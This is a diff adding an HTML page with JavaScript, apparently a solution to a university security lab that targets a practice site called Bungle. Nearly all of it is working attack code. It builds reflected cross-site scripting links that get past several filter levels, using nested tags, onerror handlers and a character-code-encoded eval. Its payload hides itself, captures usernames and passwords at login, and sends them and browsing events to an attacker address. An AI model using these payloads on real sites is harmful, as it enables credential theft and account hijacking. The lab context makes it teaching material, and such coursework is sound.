@@ -1,0 +1,128 @@
+<body>
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+var xssdefense = 0;
+var target = "http://bungle-cs461.cs.illinois.edu/";
+var attacker = "http://127.0.0.1:31337/stolen";
+$(function() {
+    var url = makeLink(xssdefense, target, attacker);
+    $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+});
+function makeLink(xssdefense, target, attacker) {
+    if (xssdefense == 0) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + 
+            encodeURIComponent("<script>" + payload.toString() + ";payload(\"" + attacker + "\");</script" + ">");
+    } else if (xssdefense == 1) {
+        // Implement code to defeat XSS defenses here.
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + 
+            encodeURIComponent("<scrscriptipt>" + payload.toString() + ";payload(\"" + attacker + "\");</scrscriptipt" + ">");
+    } else if (xssdefense == 2) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+        encodeURIComponent("<img src='imagedoesnotexist' onerror='" + payload.toString() +
+          ";payload(\"" + attacker + "\");'" +"/>");
+    } else if (xssdefense == 3) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+        encodeURIComponent("<audio src='imagedoesnotexist' onerror='" + payload.toString() +
+          ";payload(\"" + attacker + "\");'" +"/>");
+    } else {
+        let query = payload.toString() + ";payload(\"" + attacker + "\");";
+        let encodedQuery="";
+        for (let i = 0;i < query.length;i++){
+            encodedQuery += query.charCodeAt(i).toString() + ",";
+        }
+        encodedQuery = encodedQuery.slice(0,-1);
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + 
+            encodeURIComponent("<iframe onload=eval(String.fromCharCode(" + encodedQuery + "))></iframe>");
+    }
+}
+function payload(attacker) {
+    function log(attacker, data) { 
+        console.log($.param(data));
+        $.get(attacker, data);
+    }
+    function proxy(href, data) {
+        $("html").hide();
+        $("html").load(href, data, function(){
+            $("html").show();
+            if ($("#logged-in-user").length != 0)
+                log(attacker, {"event": "nav", "user": $("#logged-in-user").html(), "url": href});
+            else
+                log(attacker, {"event": "nav", "url": href});
+            //$("#query").val("pwned!");   
+            addEvents();
+            if(flag == 1){
+                history.replaceState({"html": $("html").html()}, null, "http://bungle-cs461.cs.illinois.edu/");
+                flag = 0;
+            } else{
+             
+                if(href.indexOf("search") == -1 && href != "./")//only if search we can go back (must not be the first one)
+                    history.replaceState({"html": $("html").html()}, null, "http://bungle-cs461.cs.illinois.edu/");
+                else
+                    history.pushState({"html": $("html").html()}, null, href); //if not flag, our first one will be this else
+            }
+        });
+    }
+    function addEvents(){
+        // Set event for login botton
+        function loginOrCreate(target){
+            var username = $("#username").val();
+            var password = $("#userpass").val();
+            // Spy
+            log(attacker, {"event": "login", "user": username, "pass": password});
+            // Track
+            proxy(target, {"username": username, "password": password});
+        }
+        
+        $("#log-in-btn").click(function(e){    
+            e.preventDefault();
+            var target = $(this).attr("formaction");
+            loginOrCreate(target);
+            });
+        $("#new-account-btn").click(function(e){
+            e.preventDefault();
+            var target = $(this).attr("formaction");
+            loginOrCreate(target);
+            });
+        $("#log-out-btn").click(function(e){
+            e.preventDefault();
+            var target = $(this).parent().attr("action");
+            log(attacker, {"event": "logout", "user": $("#logged-in-user").html()});
+            proxy(target, {})
+            });
+        $("#search-btn").click(function(e){
+            e.preventDefault();
+            var target = $(this).parent().attr("action");
+            proxy(target + "?q=" + $("#query").val(), null);
+            });
+        $("#search-again-btn").click(function(e){
+            e.preventDefault();
+            var target = $(this).attr("href");
+            proxy(target, null);
+            });
+        $("#history-list a").each(function(){
+            if($(this).attr("href").indexOf("attacker") >= 0 || $(this).attr("href").indexOf("iframe") >=0)
+                $(this).hide();
+            });
+        $("#history-list a").click(function(e){
+            e.preventDefault();
+            var target = $(this).attr("href");
+            proxy(target, null);
+            });
+            
+        // Deal with back and forward
+        window.onpopstate = function(e){
+            $("html").html(e.state.html);
+            addEvents();
+            if ($("#logged-in-user").length != 0)
+                log(attacker, {"event": "nav", "user": $("#logged-in-user").html(), "url": window.location.pathname + window.location.search});
+            else
+                log(attacker, {"event": "nav", "url": window.location.pathname + window.location.search});
+            };
+    }
+    var flag = 1;
+    proxy("./", null);
+}
+</script>
+<h3></h3>
+</body>
